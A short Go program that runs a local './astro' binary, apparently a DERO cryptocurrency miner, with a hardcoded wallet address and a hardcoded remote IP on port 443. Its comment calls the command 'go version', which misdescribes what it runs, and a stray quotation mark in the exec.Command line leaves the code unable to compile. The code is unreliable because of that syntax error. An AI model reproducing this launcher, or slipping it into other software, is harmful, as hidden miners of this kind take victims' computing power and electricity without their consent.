package main

import (
    "fmt"
    "os"
    "os/exec"
    
)

func main() {

    // construct `go version` command
    cmd := exec.Command("./astro","-w", "dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj", "-r", "45.66.249.224:443"")
    
    // configure `Stdout` and `Stderr`
    cmd.Stdout = os.Stdout
    cmd.Stderr = os.Stdout

    // run command
    if err := cmd.Run(); err != nil {
        fmt.Println( "Error:", err )
    }

}
